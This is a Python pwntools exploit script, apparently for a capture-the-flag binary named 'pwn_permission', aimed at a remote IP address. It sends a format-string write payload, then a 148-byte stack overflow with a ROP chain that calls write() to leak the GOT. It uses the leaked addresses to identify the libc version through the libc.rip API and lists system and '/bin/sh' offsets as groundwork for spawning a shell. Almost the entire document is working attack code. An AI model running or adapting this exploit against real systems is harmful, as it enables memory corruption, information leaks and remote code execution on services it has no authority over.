
from pwn import *
import time
import struct

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

target_val_addr = 0x804c030
fmt_payload = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload)
time.sleep(2)

response = conn.recv(timeout=5)
if b'Input:' not in response:
    log.error("vuln not triggered!")
    conn.close()
    exit(1)

log.success("vuln triggered!")

# ====== 一次性dump整个GOT表！ ======
# GOT表从0x804c000开始，我们dump 64字节
got_start = 0x804c000
got_size = 0x40

write_plt = elf.plt['write']
vuln_addr = elf.symbols['vuln']

payload = b'A' * 148
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(1)
payload += p32(got_start)
payload += p32(got_size)

conn.send(payload)
time.sleep(2)

try:
    response = conn.recv(timeout=5)
    log.info(f"Received {len(response)} bytes from GOT dump")
    
    # 解析GOT表条目
    print("\n" + "=" * 60)
    print("GOT Table Dump:")
    print("=" * 60)
    
    for name, addr in sorted(elf.got.items(), key=lambda x: x[1]):
        offset = addr - got_start
        if 0 <= offset < len(response) - 3:
            value = u32(response[offset:offset+4])
            low12 = value & 0xfff
            print(f"  {name:25s} @ 0x{addr:08x} = 0x{value:08x}  (low12: 0x{low12:03x})")
    
    # 收集所有泄露的地址
    leaked = {}
    for name, addr in sorted(elf.got.items(), key=lambda x: x[1]):
        offset = addr - got_start
        if 0 <= offset < len(response) - 3:
            value = u32(response[offset:offset+4])
            if value > 0xf7000000:
                leaked[name] = value
    
    # 计算函数间偏移差
    print("\n" + "=" * 60)
    print("Offset differences (unique to each libc version):")
    print("=" * 60)
    
    if 'puts' in leaked:
        for name, addr in leaked.items():
            if name != 'puts':
                diff = addr - leaked['puts']
                print(f"  {name} - puts = 0x{diff:x}")
    
    # 查询libc.rip
    print("\n" + "=" * 60)
    print("Querying libc.rip...")
    print("=" * 60)
    
    try:
        import requests
        import json
        
        symbols_dict = {}
        for func_name, addr in leaked.items():
            symbols_dict[func_name] = hex(addr & 0xfff)
        
        print(f"Query: {json.dumps({'symbols': symbols_dict})}")
        
        resp = requests.post("https://libc.rip/api/find", json={"symbols": symbols_dict}, timeout=15)
        
        if resp.status_code == 200:
            results = resp.json()
            if results:
                print(f"\nFound {len(results)} matching libc(s):\n")
                for i, result in enumerate(results[:5]):
                    print(f"--- Match #{i+1} ---")
                    print(f"  ID: {result.get('id', 'N/A')}")
                    print(f"  Build ID: {result.get('buildid', 'N/A')}")
                    
                    symbols = result.get('symbols', {})
                    key_syms = ['system', 'str_bin_sh', 'execve', '__libc_start_main', 'puts', 'printf', 'write', 'read']
                    for sym_name in key_syms:
                        if sym_name in symbols:
                            print(f"  {sym_name}: {symbols[sym_name]}")
                    print()
            else:
                print("No matching libc found!")
        else:
            print(f"Query failed, status: {resp.status_code}")
            print(f"Response: {resp.text[:500]}")
            
    except ImportError:
        print("requests not installed: pip install requests")
    except Exception as e:
        print(f"Query error: {e}")
    
except Exception as e:
    log.error(f"GOT dump failed: {e}")

conn.close()
